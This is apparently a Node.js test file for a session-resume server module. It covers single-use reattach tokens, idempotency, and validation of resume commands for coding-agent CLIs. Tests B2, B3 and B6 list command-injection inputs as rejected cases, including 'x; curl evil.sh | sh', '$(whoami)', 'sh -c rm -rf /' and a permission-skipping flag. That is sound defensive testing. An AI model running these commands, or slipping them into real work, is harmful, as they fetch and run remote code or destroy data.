// Fail-first tests for server/session-resume.mjs (build lane B15).
//
// What this guards (authoring-gate answers):
//  1. Reattach tokens are opaque, single-use, expiring capabilities. Credible
//     regression: redeem stops deleting (double-use) or expiry stops being
//     enforced (stale token reattaches a stranger's session).
//  2. Resume argv validation is shapes-only: caller-constructed argv can never
//     become a process spawn (D1 threat-model §2: agent.start argv injection,
//     report_agent_session deferred RCE). Credible regression: the session-id
//     slot regex is loosened and `; curl … | sh` passes validation.
//  3. The reattach flow follows D2 session-lifecycle: 60s reattach window,
//     occupant re-verification after restart, detached-means-fate-unknown
//     (never declared dead, claim untouched), idempotent reattach (duplicate
//     key returns the existing session, no second side effect).
//  4. No transcript capture/replay path exists in the module (native --resume
//     only). The source scan is the cheapest independent guard for this
//     negative contract: it fails when transcript-handling code is added and
//     survives identifier-only refactors (comments are stripped first).
//
// The fake adapter below implements exactly the documented adapter surface
// (getOccupant/spawnAgent, optional requestReportState); unknown methods throw
// naturally. It never implements the manager's own logic (idempotency,
// state transitions, argv construction) — those are what's under test.
import test from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import {
  ResumeError,
  ReattachTokenError,
  ResumeCommandError,
  OccupantChangedError,
  ResumeTimeoutError,
  IdempotencyError,
  createReattachStore,
  createIdempotencyStore,
  registerResumeKind,
  listResumeKinds,
  validateResumeCommand,
  formatResumeCommand,
  createReattachManager,
  REATTACH_TIMEOUT_MS_DEFAULT,
  httpStatusForResumeError,
} from "../server/session-resume.mjs";

// ---------------------------------------------------------------------------
// A. Reattach tokens: opaque, single-use, expiring.
// ---------------------------------------------------------------------------

test("A1 mint returns an opaque expiring token; two mints differ", () => {
  const store = createReattachStore();
  const a = store.mint("session-abc");
  const b = store.mint("session-abc");
  assert.equal(typeof a.token, "string");
  assert.ok(a.token.length >= 32, "token carries real entropy");
  assert.ok(!a.token.includes("session-abc"), "opaque: no session id inside the token");
  assert.ok(a.expiresAt > Date.now(), "expires in the future");
  assert.notEqual(a.token, b.token, "every mint is unique");
});

test("A2 redeem returns the bound session id; double redeem is TOKEN_REUSED", () => {
  const store = createReattachStore();
  const { token } = store.mint("session-abc");
  assert.deepEqual(store.redeem(token), { sessionId: "session-abc" });
  assert.throws(() => store.redeem(token), (err) => {
    assert.ok(err instanceof ReattachTokenError);
    assert.equal(err.code, "TOKEN_REUSED");
    return true;
  });
});

test("A3 unknown vs malformed tokens are distinguished", () => {
  const store = createReattachStore();
  const { token } = store.mint("s1");
  const forged = token.slice(0, -1) + (token.endsWith("A") ? "B" : "A");
  assert.throws(() => store.redeem(forged), (err) => {
    assert.ok(err instanceof ReattachTokenError);
    assert.equal(err.code, "TOKEN_UNKNOWN");
    return true;
  });
  for (const bad of [null, undefined, 42, "", "short", "not base64url!!", "x".repeat(200), {}, []]) {
    assert.throws(() => store.redeem(bad), (err) => {
      assert.ok(err instanceof ReattachTokenError, String(bad));
      assert.equal(err.code, "TOKEN_MALFORMED", String(bad));
      return true;
    });
  }
});

test("A4 expiry, revoke, and sweep kill tokens", () => {
  let t = 1_000_000;
  const store = createReattachStore({ ttlMs: 60_000, now: () => t });
  const { token: expiring } = store.mint("s1");
  const { token: revoked } = store.mint("s2");
  store.revoke("s2");
  assert.throws(() => store.redeem(revoked), (err) => err.code === "TOKEN_UNKNOWN");
  t += 60_001;
  assert.throws(() => store.redeem(expiring), (err) => err.code === "TOKEN_EXPIRED");
  assert.equal(store.size, 0, "failed redeems prune eagerly");
  // Sweep prunes entries that died without any redeem attempt:
  store.mint("s3");
  store.mint("s4");
  t += 60_001;
  assert.equal(store.sweep(), 2, "both dead entries pruned");
  assert.equal(store.size, 0);
});

// ---------------------------------------------------------------------------
// B. Resume argv validation: allowlisted SHAPES only (D1 §2).
// ---------------------------------------------------------------------------

test("B1 valid claude resume shapes are accepted", () => {
  assert.deepEqual(
    validateResumeCommand("claude", ["claude", "--resume", "sess_abc-123"]),
    { binary: "claude", sessionRef: "sess_abc-123" });
  assert.equal(
    validateResumeCommand("claude", ["claude", "--resume", "sess_abc-123", "--model", "sonnet"]).sessionRef,
    "sess_abc-123");
});

test("B2 hostile argv is rejected with ARG_SHAPE (table)", () => {
  const cases = [
    ["claude", "--resume", "x; curl evil.sh | sh"],   // command injection in session slot
    ["claude", "--resume", "$(whoami)"],              // substitution in session slot
    ["claude", "--resume", "`id`"],                   // backticks in session slot
    ["claude", "--resume", "ok", "--dangerously-skip-permissions"], // unknown flag
    ["claude", "--resume"],                           // truncated shape
    ["claude", "--resume", ""],                       // empty session slot
    ["claude", "--resume", "a\0b"],                   // NUL byte
    ["claude", "--resume", ["x"]],                    // non-string arg
  ];
  for (const argv of cases) {
    assert.throws(() => validateResumeCommand("claude", argv), (err) => {
      assert.ok(err instanceof ResumeCommandError, JSON.stringify(argv));
      assert.equal(err.code, "ARG_SHAPE", JSON.stringify(argv));
      return true;
    });
  }
  for (const bad of [null, "claude --resume x", 42, undefined]) {
    assert.throws(() => validateResumeCommand("claude", bad), (err) => {
      assert.ok(err instanceof ResumeCommandError);
      assert.equal(err.code, "ARG_SHAPE", String(bad));
      return true;
    });
  }
});

test("B3 a binary that is not the registered one is BINARY_MISMATCH (table)", () => {
  for (const argv of [
    ["sh", "-c", "rm -rf /"],            // classic argv passthrough RCE
    ["/usr/bin/claude", "--resume", "x"], // absolute path, not the bare name
    ["./claude", "--resume", "x"],        // relative path dodge
  ]) {
    assert.throws(() => validateResumeCommand("claude", argv), (err) => {
      assert.ok(err instanceof ResumeCommandError);
      assert.equal(err.code, "BINARY_MISMATCH", JSON.stringify(argv));
      return true;
    });
  }
});

test("B4 unknown kind, arg-count cap, and argv-size cap", () => {
  assert.throws(() => validateResumeCommand("evilcli", ["evilcli", "--resume", "x"]),
    (err) => err instanceof ResumeCommandError && err.code === "UNKNOWN_KIND");
  assert.throws(() => validateResumeCommand("claude", ["claude", ...Array(64).fill("x")]),
    (err) => err instanceof ResumeCommandError && err.code === "ARG_COUNT");
  assert.throws(
    () => validateResumeCommand("claude", ["claude", "a".repeat(3000), "b".repeat(3000), "c".repeat(3000)]),
    (err) => err instanceof ResumeCommandError && err.code === "ARG_SIZE");
});

test("B5 registerResumeKind rejects unsafe registrations", () => {
  assert.throws(() => registerResumeKind("bad-bin-x1", {
    binary: "/bin/evil", patterns: [[{ lit: "/bin/evil" }]],
  }), /binary/);
  assert.throws(() => registerResumeKind("no-patterns-x1", { binary: "nop", patterns: [] }), /pattern/);
  assert.throws(() => registerResumeKind("two-slots-x1", {
    binary: "ts", patterns: [[{ lit: "ts" }, { slot: "sessionId" }, { slot: "word" }]],
  }), /slot/);
  assert.throws(() => registerResumeKind("wrong-first-x1", {
    binary: "wf", patterns: [[{ lit: "other" }, { slot: "sessionId" }]],
  }), /binary/);
});

test("B6 formatResumeCommand builds argv from the shape; hostile refs rejected", () => {
  const argv = formatResumeCommand("claude", "sess-9");
  assert.deepEqual(argv, ["claude", "--resume", "sess-9"]);
  assert.deepEqual(validateResumeCommand("claude", argv).sessionRef, "sess-9",
    "what we build is what we allow");
  assert.throws(() => formatResumeCommand("claude", "x; rm -rf /"),
    (err) => err instanceof ResumeCommandError && err.code === "BAD_SESSION_REF");
  assert.throws(() => formatResumeCommand("nope-kind-x1", "sess-1"),
    (err) => err instanceof ResumeCommandError && err.code === "UNKNOWN_KIND");
});

test("B7 listResumeKinds exposes the registered kinds", () => {
  const kinds = listResumeKinds();
  assert.ok(kinds.includes("claude") && kinds.includes("codex"),
    `expected claude+codex in ${kinds.join(",")}`);
});

// ---------------------------------------------------------------------------
// C. No transcript replay: negative contract, cheapest independent guard.
// ---------------------------------------------------------------------------

test("C1 executable code contains no transcript capture/replay path", async () => {
  const src = await readFile(new URL("../server/session-resume.mjs", import.meta.url), "utf8");
  const codeOnly = src
    .replace(/\/\*[\s\S]*?\*\//g, "")
    .replace(/(^|\s)\/\/.*$/gm, "$1");
  assert.ok(!/transcript/i.test(codeOnly),
    "the prohibition may live in comments; never in executable code or identifiers");
});

// ---------------------------------------------------------------------------
// D. Idempotency store (D2 §4): scoped keys, 24h TTL, stored responses.
// ---------------------------------------------------------------------------

test("D1 duplicate key returns the stored response; stored copy is isolated", () => {
  const idem = createIdempotencyStore();
  assert.deepEqual(idem.check("k1", "reattach"), { hit: false });
  const response = { sessionId: "s1", state: "active" };
  idem.record("k1", "reattach", response);
  const hit = idem.check("k1", "reattach");
  assert.equal(hit.hit, true);
  assert.deepEqual(hit.response, response);
  hit.response.state = "MUTATED";
  assert.deepEqual(idem.check("k1", "reattach").response, response,
    "caller mutation of a returned copy must not corrupt the store");
});

test("D2 a key recorded for one transition is rejected for another", () => {
  const idem = createIdempotencyStore();
  idem.record("k1", "reattach", { ok: true });
  assert.throws(() => idem.check("k1", "destroy"), (err) => {
    assert.ok(err instanceof IdempotencyError);
    assert.equal(err.code, "IDKEY_SCOPE_MISMATCH");
    return true;
  });
});

test("D3 entries expire after the TTL and sweep prunes them", () => {
  let t = 0;
  const idem = createIdempotencyStore({ now: () => t, ttlMs: 1000 });
  idem.record("k1", "reattach", { ok: true });
  t += 1001;
  assert.deepEqual(idem.check("k1", "reattach"), { hit: false });
  idem.record("k2", "reattach", { ok: true });
  t += 1001;
  assert.equal(idem.sweep(), 1);
});

test("D4 empty keys are rejected", () => {
  const idem = createIdempotencyStore();
  assert.throws(() => idem.check("", "reattach"),
    (err) => err instanceof IdempotencyError && err.code === "IDKEY_REQUIRED");
  assert.throws(() => idem.record("", "reattach", {}),
    (err) => err instanceof IdempotencyError && err.code === "IDKEY_REQUIRED");
});

// ---------------------------------------------------------------------------
// E. Reattach manager (D2 §2.5, §3.2): explicit reattach, occupant
//    re-verification, 60s window, detached-means-fate-unknown.
// ---------------------------------------------------------------------------

function fakeAdapter({ occupant, hang = false, calls = [], reportState } = {}) {
  const occ = occupant === undefined ? { occupantId: "occ-1", agentId: "ag-1" } : occupant;
  const adapter = {
    calls,
    async getOccupant(paneId) {
      calls.push(["getOccupant", paneId]);
      if (hang) await new Promise(() => {});
      return occ;
    },
    async spawnAgent(opts) {
      calls.push(["spawnAgent", opts]);
      return { paneId: "pane-new", agentId: "ag-new", occupantId: "occ-new" };
    },
  };
  if (reportState !== undefined) {
    adapter.requestReportState = async (paneId) => {
      calls.push(["requestReportState", paneId]);
      if (reportState === "throw") throw Object.assign(new Error("busy"), { code: "SERVER" });
    };
  }
  return adapter;
}

function basicManager(adapter, journal = []) {
  const m = createReattachManager({ adapter, journal });
  m.registerSession({
    sessionId: "s1", kind: "claude", paneId: "pane-1",
    agentId: "ag-1", occupantId: "occ-1",
    resumeRef: { sessionRef: "sess-abc", resumeCommand: ["claude", "--resume", "sess-abc"] },
  });
  return m;
}

test("E1 registerSession fails closed on unknown kind or invalid stored resume command", () => {
  const m = createReattachManager({ adapter: fakeAdapter() });
  assert.throws(() => m.registerSession({
    sessionId: "s9", kind: "nope", paneId: "p", agentId: "a", occupantId: "o",
  }), (err) => err instanceof ResumeCommandError && err.code === "UNKNOWN_KIND");
  assert.throws(() => m.registerSession({
    sessionId: "s9", kind: "claude", paneId: "p", agentId: "a", occupantId: "o",
    resumeRef: { sessionRef: "x", resumeCommand: ["claude", "--resume", "x", "--evil"] },
  }), (err) => err instanceof ResumeCommandError && err.code === "ARG_SHAPE");
  assert.throws(() => m.status("s9"), (err) => err.code === "NO_SUCH_SESSION",
    "rejected registrations leave no session behind");
});

test("E2 markDetached means fate unknown: journaled, no adapter calls, claim untouched", () => {
  const journal = [];
  const adapter = fakeAdapter();
  const m = basicManager(adapter, journal);
  const st = m.markDetached("s1", "bridge_health");
  assert.equal(st.state, "detached");
  assert.equal(adapter.calls.length, 0, "detach performs no herdr calls");
  assert.ok(journal.some((e) => e.event === "detached" && e.detail.reason === "bridge_health"));
});

test("E3 reattach happy path: occupant re-verified, session active", async () => {
  const journal = [];
  const adapter = fakeAdapter();
  const m = basicManager(adapter, journal);
  m.markDetached("s1", "bridge_health");
  const { token } = m.mintReattachToken("s1");
  const res = await m.reattach({ token, idempotencyKey: "k-reattach-1" });
  assert.deepEqual(res, {
    sessionId: "s1", paneId: "pane-1", agentId: "ag-1", occupantId: "occ-1",
    occupantChanged: false, state: "active", resumed: false, duplicate: false,
  });
  assert.equal(m.status("s1").state, "active");
  assert.ok(journal.some((e) => e.event === "occupant_reverified"));
  assert.ok(journal.some((e) => e.event === "reattached"));
});

test("E4 duplicate reattach returns the existing session with no new side effects", async () => {
  const adapter = fakeAdapter();
  const m = basicManager(adapter);
  m.markDetached("s1", "bridge_health");
  const t1 = m.mintReattachToken("s1").token;
  const first = await m.reattach({ token: t1, idempotencyKey: "k-dup" });
  const callsAfterFirst = adapter.calls.length;
  const t2 = m.mintReattachToken("s1").token;
  const second = await m.reattach({ token: t2, idempotencyKey: "k-dup" });
  assert.equal(second.duplicate, true);
  assert.deepEqual({ ...second, duplicate: false }, first, "stored response replayed byte-for-byte");
  assert.equal(adapter.calls.length, callsAfterFirst, "no herdr call on duplicate");
  assert.deepEqual(m.tokenStore.redeem(t2), { sessionId: "s1" },
    "the duplicate path must not burn the fresh token");
});

test("E5 reattach on an already-active session converges without adapter calls", async () => {
  const adapter = fakeAdapter();
  const m = basicManager(adapter);
  const { token } = m.mintReattachToken("s1");
  const res = await m.reattach({ token, idempotencyKey: "k-converge" });
  assert.equal(res.state, "active");
  assert.equal(res.duplicate, false);
  assert.equal(adapter.calls.length, 0);
});

test("E6 occupant changed without forceRepin is refused; session stays detached", async () => {
  const journal = [];
  const adapter = fakeAdapter({ occupant: { occupantId: "occ-INTRUDER", agentId: "ag-2" } });
  const m = basicManager(adapter, journal);
  m.markDetached("s1", "bridge_health");
  const { token } = m.mintReattachToken("s1");
  await assert.rejects(m.reattach({ token, idempotencyKey: "k-occ" }), (err) => {
    assert.ok(err instanceof OccupantChangedError);
    assert.equal(err.code, "session_occupant_changed");
    return true;
  });
  assert.equal(m.status("s1").state, "detached", "back to fate-unknown, never destroyed");
  assert.ok(!adapter.calls.some(([name]) => name === "spawnAgent"), "no spawn on refusal");
  assert.ok(journal.some((e) => e.event === "occupant_changed"));
});

test("E7 occupant changed with forceRepin re-pins and proceeds", async () => {
  const adapter = fakeAdapter({ occupant: { occupantId: "occ-2", agentId: "ag-2" } });
  const m = basicManager(adapter);
  m.markDetached("s1", "bridge_health");
  const { token } = m.mintReattachToken("s1");
  const res = await m.reattach({ token, idempotencyKey: "k-force", forceRepin: true });
  assert.equal(res.state, "active");
  assert.equal(res.occupantChanged, true);
  assert.equal(res.occupantId, "occ-2");
  assert.equal(m.status("s1").occupantId, "occ-2", "pin updated to the re-verified occupant");
});

test("E8 pane gone with a stored ref: native --resume spawn, argv adapter-constructed", async () => {
  const journal = [];
  const adapter = fakeAdapter({ occupant: null }); // pane gone from the snapshot
  const m = basicManager(adapter, journal);
  m.markDetached("s1", "bridge_health");
  const { token } = m.mintReattachToken("s1");
  const res = await m.reattach({ token, idempotencyKey: "k-resume" });
  assert.equal(res.state, "active");
  assert.equal(res.resumed, true, "native resume handshake performed");
  assert.equal(res.paneId, "pane-new", "new pane attached to the same room session");
  assert.equal(res.occupantChanged, true);
  const spawn = adapter.calls.find(([name]) => name === "spawnAgent");
  assert.equal(spawn[1].kind, "claude");
  assert.equal(spawn[1].command, "claude");
  assert.deepEqual(spawn[1].args, ["--resume", "sess-abc"],
    "argv rebuilt from the registered shape — never the stored bytes");
  assert.equal(spawn[1].resumeSessionRef, "sess-abc");
  assert.ok(spawn[1].signal instanceof AbortSignal,
    "reattach passes the timeout signal into spawnAgent");
  assert.ok(journal.some((e) => e.event === "pane_replaced_after_restart"));
});

test("E15 spawn racing the timeout is never attached and leaves no leaked pane", async () => {
  // The V154 race: the reattach timeout fires while spawnAgent is still
  // pending. When the slow spawn finally resolves, the session must NOT
  // attach the raced pane (no transition) and the raced pane must be
  // cleaned up (no leaked pane) — even when the adapter ignores the signal.
  const closed = [];
  let releaseSpawn;
  const gate = new Promise((resolve) => { releaseSpawn = resolve; });
  const calls = [];
  const adapter = {
    calls,
    async getOccupant(paneId) {
      calls.push(["getOccupant", paneId]);
      return null; // pane gone -> the native --resume spawn path
    },
    async spawnAgent(opts) {
      calls.push(["spawnAgent", opts]);
      await gate; // slow bridge: the spawn stays pending across the timeout
      return { paneId: "pane-raced", agentId: "ag-raced", occupantId: "occ-raced" };
    },
    async closePane(paneId) {
      calls.push(["closePane", paneId]);
      closed.push(paneId);
    },
  };
  const m = createReattachManager({ adapter });
  m.registerSession({
    sessionId: "s1", kind: "claude", paneId: "pane-1",
    agentId: "ag-1", occupantId: "occ-1",
    resumeRef: { sessionRef: "sess-abc", resumeCommand: ["claude", "--resume", "sess-abc"] },
  });
  m.markDetached("s1", "bridge_health");
  const { token } = m.mintReattachToken("s1");
  await assert.rejects(
    m.reattach({ token, idempotencyKey: "k-race", resumeTimeoutMs: 50 }),
    (err) => err instanceof ResumeTimeoutError && err.code === "TIMEOUT");
  const spawn = calls.find(([name]) => name === "spawnAgent");
  assert.ok(spawn[1].signal instanceof AbortSignal, "the timeout signal reaches the adapter");
  assert.equal(m.status("s1").state, "detached", "no transition when the window elapses");
  releaseSpawn();
  await new Promise((r) => setTimeout(r, 50)); // let the raced spawn land
  assert.equal(m.status("s1").state, "detached", "the late resolution is never attached");
  assert.equal(m.status("s1").paneId, "pane-1", "the session record keeps the old pane id");
  assert.deepEqual(closed, ["pane-raced"], "the raced pane is closed, not leaked");
});

test("E9 pane gone without a stored ref: cannot resume, stays detached, no spawn", async () => {
  const adapter = fakeAdapter({ occupant: null });
  const m = createReattachManager({ adapter });
  m.registerSession({
    sessionId: "s1", kind: "claude", paneId: "pane-1",
    agentId: "ag-1", occupantId: "occ-1", // no resumeRef
  });
  m.markDetached("s1", "bridge_health");
  const { token } = m.mintReattachToken("s1");
  await assert.rejects(m.reattach({ token, idempotencyKey: "k-noref" }),
    (err) => err instanceof ResumeError && err.code === "NO_RESUME_REF");
  assert.equal(m.status("s1").state, "detached");
  assert.ok(!adapter.calls.some(([name]) => name === "spawnAgent"));
});

test("E10 reattach honors the 60s window: hanging bridge -> TIMEOUT, back to detached", async () => {
  const adapter = fakeAdapter({ hang: true });
  const m = basicManager(adapter);
  m.markDetached("s1", "bridge_health");
  const { token } = m.mintReattachToken("s1");
  await assert.rejects(
    m.reattach({ token, idempotencyKey: "k-timeout", resumeTimeoutMs: 50 }),
    (err) => {
      assert.ok(err instanceof ResumeTimeoutError);
      assert.equal(err.code, "TIMEOUT");
      return true;
    });
  assert.equal(m.status("s1").state, "detached");
  assert.deepEqual(httpStatusForResumeError(new ResumeTimeoutError("TIMEOUT", "x")),
    { status: 504, code: "herdr_timeout" });
});

test("E11 the default reattach window is 60s (D2 §1.3 T4)", () => {
  assert.equal(REATTACH_TIMEOUT_MS_DEFAULT, 60_000);
});

test("E12 idempotency key is required; tokens are single-use across reattach calls", async () => {
  const adapter = fakeAdapter();
  const m = basicManager(adapter);
  m.markDetached("s1", "bridge_health");
  const { token } = m.mintReattachToken("s1");
  await assert.rejects(m.reattach({ token }),
    (err) => err instanceof IdempotencyError && err.code === "IDKEY_REQUIRED");
  await m.reattach({ token, idempotencyKey: "k-ok" });
  await assert.rejects(m.reattach({ token, idempotencyKey: "k-other" }),
    (err) => err instanceof ReattachTokenError && err.code === "TOKEN_REUSED");
});

test("E13 reportState request is best-effort: failure never fails the reattach", async () => {
  for (const reportState of [undefined, "throw"]) {
    const journal = [];
    const adapter = fakeAdapter({ reportState });
    const m = basicManager(adapter, journal);
    m.markDetached("s1", "bridge_health");
    const { token } = m.mintReattachToken("s1");
    const res = await m.reattach({ token, idempotencyKey: `k-report-${reportState}` });
    assert.equal(res.state, "active");
    if (reportState === "throw") {
      assert.ok(journal.some((e) => e.event === "report_request_failed"));
    }
  }
});

test("E14 mintReattachToken fails closed for unknown sessions", () => {
  const m = createReattachManager({ adapter: fakeAdapter() });
  assert.throws(() => m.mintReattachToken("ghost"),
    (err) => err instanceof ResumeError && err.code === "NO_SUCH_SESSION");
});

// ---------------------------------------------------------------------------
// F. Domain error -> HTTP mapping (D2 §2.9, append-only).
// ---------------------------------------------------------------------------

test("F1 httpStatusForResumeError maps the error vocabulary", () => {
  const cases = [
    [new OccupantChangedError("session_occupant_changed", "x"), 409, "session_occupant_changed"],
    [new ResumeTimeoutError("TIMEOUT", "x"), 504, "herdr_timeout"],
    [new ReattachTokenError("TOKEN_EXPIRED", "x"), 401, "reattach_token_invalid"],
    [new ResumeCommandError("ARG_SHAPE", "x"), 400, "resume_command_rejected"],
    [new IdempotencyError("IDKEY_REQUIRED", "x"), 400, "bad_idempotency_key"],
    [new ResumeError("NO_SUCH_SESSION", "x"), 404, "session_not_found"],
    [new ResumeError("NO_RESUME_REF", "x"), 409, "session_not_resumable"],
    [Object.assign(new Error("adapter blew up"), { code: "VERSION_MISMATCH" }), 503, "herdr_version_mismatch"],
    [Object.assign(new Error("socket died"), { code: "TRANSPORT" }), 502, "herdr_transport_error"],
    [Object.assign(new Error("nope"), { code: "METHOD_UNSUPPORTED" }), 501, "herdr_method_unsupported"],
    [new Error("totally unknown"), 500, "herdr_server_error"],
  ];
  for (const [err, status, code] of cases) {
    assert.deepEqual(httpStatusForResumeError(err), { status, code },
      `code ${err.code ?? "<none>"}`);
  }
});
